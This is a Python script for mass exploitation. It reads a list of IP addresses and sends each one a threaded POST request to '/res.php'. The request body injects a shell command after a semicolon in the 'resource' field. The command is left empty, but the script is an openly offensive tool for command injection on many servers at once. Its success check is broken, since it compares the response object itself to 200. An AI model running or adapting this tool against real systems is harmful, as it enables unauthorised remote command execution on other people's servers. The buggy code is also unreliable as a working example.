import sys
import threading
import requests
import os
import socket
import time
from queue import *
from threading import Thread
import base64
import urllib.parse
 
if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" <ip list>")

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
command = ""

payload = '{}'.format(command)
data = 'action=get&resource=;{}'.format(urllib.parse.quote(payload))

headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
  }
 
info = open(str(sys.argv[1]),'a+')
 
def test(ip):
    ip = str(ip).rstrip("\n")
    try:
        ip = ip+"/res.php"
        x = requests.post("http://"+ip, headers=headers, data=data, allow_redirects=False, verify=False)
        #print(x.text)
        if x == 200:
            print("[FOUND] "+ip)
    except Exception:
        print("[NOT FOUND]")
        pass
 

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=test, args=(input,))
            thread.start()
            time.sleep(0.05)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return


if __name__ == "__main__":
    main()
